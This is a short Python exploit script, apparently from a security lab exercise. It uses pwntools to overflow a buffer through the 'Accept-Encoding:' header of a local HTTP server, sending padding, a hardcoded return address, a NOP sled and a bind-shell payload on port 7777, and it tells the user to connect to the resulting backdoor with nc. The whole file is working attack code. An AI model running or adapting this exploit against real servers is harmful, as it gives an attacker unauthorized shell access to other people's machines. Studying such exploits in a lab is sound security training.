# injectCode.py

"""
Script used to create a shell session on target machine.
To connect to backdoor shell, use:
$user@host:_> nc target_address target_port
"""

from pwn import *

#target_address = p64(0x7fffffffdb80) # Works in gdb
target_address = p64(0x7fffffffdc10) # Works outside of gdb
# causeCrash.py revealed that the "Accept-Encoding:" field is vulnerable
target_field   = b"Accept-Encoding:"
padding        = b"A" * 56 # In gdb the buffer was discovered to be 56 bytes long
nopsled        = b"\x90" * 200 # Arbitrary number of nop x86 operations

context(arch = "amd64", os = "linux")
code = asm(shellcraft.amd64.linux.bindsh(port = 7777))

conn           = remote("127.0.0.1", 8888)
conn.send(target_field + padding + target_address + nopsled + code + b"\r\n")
